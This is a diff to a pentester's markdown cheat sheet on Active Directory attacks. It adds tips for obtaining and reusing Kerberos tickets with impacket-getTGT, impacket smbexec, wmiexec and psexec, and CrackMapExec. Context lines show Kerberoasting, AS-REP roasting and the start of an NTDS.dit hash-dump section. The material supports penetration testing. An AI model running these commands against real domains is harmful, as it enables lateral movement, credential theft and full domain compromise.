@@ -88,7 +88,7 @@ $password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -For
 $credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
 Invoke-Command -ComputerName Server01 -Credential $credential -ScriptBlock { COMMAND }
 ```
-## Kerberos attacks
+## Kerberos
 ### Kerberoast
 GetUserSPNs and get hashes :
 ```bash
@@ -107,6 +107,26 @@ Get a TGT for a user, whithout his password, if you know that this account have 
 ```bash
 impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME -no-pass
 ```
+### Tips to authenticate with Kerberos while pentesting
+If you have a valid username/password, you can ask the KDC for a TGT. It is truly important to use the real domain name and not an alias :
+```bash
+impacket-getTGT 'domain.local/username:password' -dc-ip DC_IP
+```
+This command will create a .ccache file, which is your TGT allowing you to authenticate against the KDC. Export it on KRB5CCNAME to use it :
+```bash
+export KRB5CCNAME=/absolute/path/to/user.ccname
+```
+Then you can use, for example the impacket collection, with -k and -no-pass options to use kerberos authentication :
+```bash
+impacket-smbexec domain.local/username@FQDN -k -no-pass
+impacket-wmiexec domain.local/username@FQDN -k -no-pass
+impacket-psexec domain.local/username@FQDN -k -no-pass
+```
+With CrackMapExec, use the -k and --use-kcache options to use a kerberos authentication :
+```bash
+crackmapexec smb IP_ADDRESS/MASK -u 'USERNAME' -k --use-kcache
+```
+
 ## NTDS Exfiltration
 Once you get domain admin, dump NTDS.dit to get all the hashes from the Active Directory :
 ```bash
